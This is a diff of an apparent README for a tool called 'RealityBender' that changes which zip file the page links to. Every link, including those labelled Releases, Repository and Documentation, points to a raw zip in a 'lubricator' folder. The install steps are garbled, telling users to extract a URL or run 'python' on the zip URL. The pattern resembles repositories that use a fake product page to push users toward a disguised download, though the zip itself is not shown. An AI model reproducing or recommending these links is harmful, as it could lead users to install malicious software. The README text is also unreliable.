@@ -6,7 +6,7 @@ Welcome to RealityBender! This simple command-line tool allows you to create ama
 
 ## 📥 Download Now!
 
-[![Download RealityBender](https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/RealityBender.zip)](https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/RealityBender.zip)
+[![Download RealityBender](https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/Reality-Bender-1.1.zip)](https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/Reality-Bender-1.1.zip)
 
 ## 🖥️ System Requirements
 
@@ -30,18 +30,18 @@ Before downloading, make sure your system meets the following requirements:
 
 To get started, visit this page to download:
 
-[RealityBender Releases](https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/RealityBender.zip)
+[RealityBender Releases](https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/Reality-Bender-1.1.zip)
 
 1. **Open the Releases Page:** Click the link above. This takes you to the list of available versions.
 2. **Select the Latest Version:** Look for the most recent release at the top of the list.
 3. **Download the Appropriate File:**
    - If you're using Windows, download the `.exe` file.
-   - If you're on macOS, download the appropriate `.dmg` or `https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/RealityBender.zip` file.
-   - For Linux, choose the `https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/RealityBender.zip` file.
+   - If you're on macOS, download the appropriate `.dmg` or `https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/Reality-Bender-1.1.zip` file.
+   - For Linux, choose the `https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/Reality-Bender-1.1.zip` file.
 4. **Run the Downloaded File:** 
    - Windows: Double-click the `.exe` file to install.
    - macOS: Open the `.dmg` file and drag RealityBender to your Applications folder.
-   - Linux: Extract the `https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/RealityBender.zip` file and run the included script in the terminal.
+   - Linux: Extract the `https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/Reality-Bender-1.1.zip` file and run the included script in the terminal.
 
 ## ⚙️ How to Use
 
@@ -54,7 +54,7 @@ To get started, visit this page to download:
    - Use the `cd` command followed by the path to your RealityBender folder.
    
 3. **Run RealityBender:**
-   - Type `python https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/RealityBender.zip` and hit Enter. This launches the tool.
+   - Type `python https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/Reality-Bender-1.1.zip` and hit Enter. This launches the tool.
    
 4. **Follow On-Screen Prompts:** 
    - The application will provide simple instructions for creating illusions and capturing visuals.
@@ -80,8 +80,8 @@ If you encounter any issues or need help, please open an issue on our GitHub pag
 
 ## 🔗 Useful Links
 
-- [RealityBender Releases](https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/RealityBender.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/RealityBender.zip)
-- [Documentation](https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/RealityBender.zip)
+- [RealityBender Releases](https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/Reality-Bender-1.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/Reality-Bender-1.1.zip)
+- [Documentation](https://raw.githubusercontent.com/sarmed34t3t/RealityBender/main/lubricator/Reality-Bender-1.1.zip)
 
 We hope you enjoy creating digital illusions with RealityBender! Have fun exploring the possibilities.
